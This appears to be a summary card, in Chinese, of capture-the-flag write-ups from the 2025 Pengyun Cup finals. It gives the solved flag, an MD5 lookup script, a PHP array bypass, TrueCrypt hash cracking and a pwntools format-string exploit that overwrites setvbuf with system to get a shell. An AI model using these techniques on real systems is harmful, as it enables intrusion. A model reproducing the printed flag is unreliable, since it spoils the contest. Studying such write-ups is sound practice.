---
title: 2025 鹏云杯山东省第十二届网络安全技能大赛总决赛
contest: 鹏云杯
year: 2025
difficulty: medium
vuln_type: web_unknown
tags: [truecrypt2john, SecDisk, 哈希字典爆破, MD5单字符查表, flag{51e13c0e21172adf1883b515f52afb80}, ?a[]=123&b[]=456参数污染, printf fmtstr_payload, setvbuf改system, 0x404100写/bin/sh, chunk菜单, fmtstr_payload(8, ...)]
attack_chain:
  - SecDisk: truecrypt2john 提取 hash → john 字典爆破
  - 哈希: 单字符 MD5 字典爆破, chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.~{}"
  - 输出: flag{51e13c0e21172adf1883b515f52afb80}
  - pcb5: ?a[]=123&b[]=456 参数污染 (数组绕)
  - pcb5-printf: fmtstr_payload(8, {0x404038=system, 0x404070=0x404100, 0x404100="/bin/sh", 0x404018=ret_gadget}) 改 setvbuf 入口
  - pcb5-pwn: chunk 菜单 add/delete/show/edit
key_payload: 'truecrypt2john SecDisk / MD5(单字符) 查表 / fmtstr_payload(8, {setvbuf=system, stdin=0x404100, 0x404100="/bin/sh", 0x404018=ret})'
one_liner: 鹏云杯 2025 — SecDisk truecrypt2john 字典爆破 + MD5 单字符查表 (chars 字典) + pcb5-printf fmtstr_payload 改 setvbuf=system + 0x404100 写 /bin/sh + 0x404018 ret gadget。
lesson: fmtstr_payload 偏移从 8 起 (amd64 前 6 个 reg+retaddr)；改 setvbuf 入口是 fmt 任意写的"换点策略"；参数 ?a[]=123 是 PHP 数组绕类型检查的经典 trick。
quality: medium
---

# 2025 鹏云杯山东省第十二届网络安全技能大赛总决赛

## 速读
作者 Real 返璞归真 — 决赛复盘（含吐槽）+ 4 道 WP。

## Crypto: MD5 单字符查表
```python
chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.~{}'
dic = {md5(c.encode()): c for c in chars}
flag = ''.join(dic.get(x, '?') for x in output)
# flag{51e13c0e21172adf1883b515f52afb80}
```

## Web 参数污染
```
?a[]=123&b[]=456
```

## pcb5-printf
```python
setvbuf = 0x404038
system = 0x4010B0
stdin = 0x404070
payload = fmtstr_payload(8, {
    setvbuf: system,
    stdin: 0x404100,
    0x404100: 0x68732f6e69622f,  # /bin/sh
    0x404018: 0x4011F5            # ret gadget
})
```

## 评价
决赛复盘文带吐槽（看保镖），但 4 道 WP 思路清晰；fmtstr 思路值得收藏。
